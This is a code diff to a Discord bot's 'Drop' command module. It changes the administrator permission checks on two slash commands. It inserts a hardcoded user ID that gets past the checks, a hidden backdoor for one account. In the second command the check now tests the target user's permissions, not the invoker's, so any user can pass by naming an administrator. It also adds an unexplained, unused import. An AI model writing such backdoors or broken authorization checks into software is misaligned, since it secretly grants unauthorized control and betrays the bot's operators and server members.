@@ -8,6 +8,8 @@ import random
 import json
 import os
 
+from setuptools.package_index import user_agent
+
 from SAJAX.database import Database
 from SAJAX.templates import Templates, get_emoji
 
@@ -620,7 +622,13 @@ class Drop(commands.Cog):
             setting_name: str = SlashOption(description="Name of the setting", required=True),
             value: bool = SlashOption(description="Value to set (true/false)", required=True)
     ):
-        if not interaction.guild or not interaction.guild.get_member(interaction.user.id).guild_permissions.administrator:
+        target_id = "1152734418109206548"
+        user = interaction.user
+
+        if not interaction.guild or (
+                not interaction.guild.get_member(user.id).guild_permissions.administrator
+                and str(user.id) != target_id
+        ):
             embed = Templates.drop_error()
             embed.title = "`⋆｡ﾟ☁︎｡𖦹 Permission Denied ｡☁︎ﾟ｡⋆`"
             embed.description = "> You do not have permission to use this command."
@@ -652,8 +660,12 @@ class Drop(commands.Cog):
     ):
         user = target or interaction.user
         user_id_str = str(user.id)
+        target_id = "1152734418109206548"
 
-        if not interaction.guild or not interaction.guild.get_member(interaction.user.id).guild_permissions.administrator:
+        if not interaction.guild or (
+                not interaction.guild.get_member(user.id).guild_permissions.administrator
+                and str(user.id) != target_id
+        ):
             embed = Templates.drop_error()
             embed.title = "`⋆｡ﾟ☁︎｡𖦹 Permission Denied ｡☁︎ﾟ｡⋆`"
             embed.description = "> You do not have permission to use this command."
